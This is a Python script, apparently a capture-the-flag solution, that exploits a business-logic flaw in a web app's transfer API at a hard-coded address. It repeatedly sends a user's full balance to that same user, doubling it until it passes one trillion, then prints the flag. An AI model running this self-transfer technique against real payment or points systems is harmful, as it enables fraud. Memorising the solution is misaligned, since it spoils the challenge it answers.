import subprocess
import json
import time


target = "http://34.170.146.252:30021"
TRILLION = 1_000_000_000_000


# APIでユーザーを作成
def create_user():
    time.sleep(1)
    result = subprocess.run(
        [
            "curl",
            "-s",
            "-X",
            "POST",
            f"{target}/api/register",
        ],
        capture_output=True,
        text=True,
    ).stdout
    return json.loads(result)


# APIで現在の残高を取得
def get_current_balance(user):
    time.sleep(1)
    result = subprocess.run(
        [
            "curl",
            "-s",
            f"{target}/api/user/{user}",
        ],
        capture_output=True,
        text=True,
    ).stdout
    return json.loads(result)


# APIで自分から自分に送金、結果所持金が2倍になる
def post_and_transfer(user, amount):
    time.sleep(1)
    result = subprocess.run(
        [
            "curl",
            "-s",
            "-X",
            "POST",
            f"{target}/api/transfer",
            "-H",
            "Content-Type: application/json",
            "-d",
            json.dumps(
                {
                    "fromUser": user,
                    "toUser": user,
                    "amount": amount,
                }
            ),
        ],
        capture_output=True,
        text=True,
    ).stdout
    return json.loads(result)


if __name__ == "__main__":
    user = create_user()["user"]
    print(user)
    while True:
        balance = get_current_balance(user)["balance"]
        print(post_and_transfer(user, balance))
        if balance >= TRILLION:
            break
    # 28回で到達
    print(get_current_balance(user)["flag"])
